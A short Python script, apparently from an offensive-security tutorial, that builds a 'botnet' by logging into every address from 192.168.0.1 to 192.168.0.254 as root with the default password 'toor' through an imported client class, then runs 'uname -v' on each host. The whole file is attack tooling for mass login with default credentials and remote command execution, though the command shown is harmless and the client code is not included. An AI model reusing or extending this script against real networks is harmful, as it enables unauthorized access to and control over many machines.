from client import Client
from threading import *

def create_botnet():
    botnet = []
    for i in range(1, 255):
        client = Client('192.168.0.' + str(i), 'root', 'toor')
        botnet.append(client)

    return botnet

def send_command(bot):
    bot.command('uname -v')


def main():
    bots = create_botnet()
    for bot in bots:
        send_command(bot)


if __name__ == '__main__':
    main()